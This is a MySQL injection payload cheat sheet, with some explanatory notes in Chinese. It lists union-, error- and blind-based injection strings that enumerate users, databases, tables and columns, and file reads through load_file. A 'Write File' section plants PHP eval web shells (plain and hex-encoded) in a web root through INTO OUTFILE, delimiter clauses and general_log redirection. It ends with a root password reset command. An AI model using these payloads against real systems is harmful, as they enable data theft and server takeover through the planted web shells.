MySQL Payload
=====================================
- Version 
    + ``SELECT @@version``
- Comment 
    + ``SELECT 1 -- comment``
    + ``SELECT 1 # comment``
    + ``SELECT /*comment*/1``
- Current User
    + ``SELECT user()``
    + ``SELECT system_user()``
- List User
    + ``SELECT user FROM mysql.user``
- Current Database
    + ``SELECT database()``
- List Database
    + ``SELECT schema_name FROM information_schema.schemata``
- List Tables
	+ ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
	+ ``1" union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#``
- List Columns
	+ ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
	+ ``1" union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='user'#``
- If
    + ``SELECT if(1=1,'foo','bar');`` =>return ``'foo'``
- Ascii
	+ ``SELECT char(0x41)``
	+ ``SELECT ascii('A')``
	+ ``SELECT 0x414243`` => return ``ABC``
- Delay
    + ``sleep(1)``
    + ``SELECT BENCHMARK(1000000,MD5('A'))``
- Read File
    + ``select @@datadir``
    + ``select load_file('databasename/tablename.MYD')``
- Blind
    + ``ascii(substring(str,pos,length)) & 32 = 1``
- Error Based
    + ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
- Write File
	+ 利用union select写入
		::
		
			?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
			?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
			union select 1,1,1 into dumpfile '/tmp/demo.txt'
			dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
	+ 利用分隔符写入
		::
		
			当Mysql注入点为盲注或报错，Union select写入的方式显然是利用不了的，那么可以通过分隔符写入。SQLMAP的 --os-shell命令，所采用的就是这种方式。
			?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
			支持四种形式：
			?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
			?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
			?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
			?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
	+ 利用log写入
		::
		
			具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。
			show variables like '%general%';                          #查看配置
			set global general_log = on;                              #开启general log模式
			set global general_log_file = 'E:/study/WWW/evil.php';    #设置日志目录为shell地址
			select '<?php eval($_GET[g]);?>'                          #写入shell
			set global general_log=off;                               #关闭general log模式
- Change Password
	+ ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
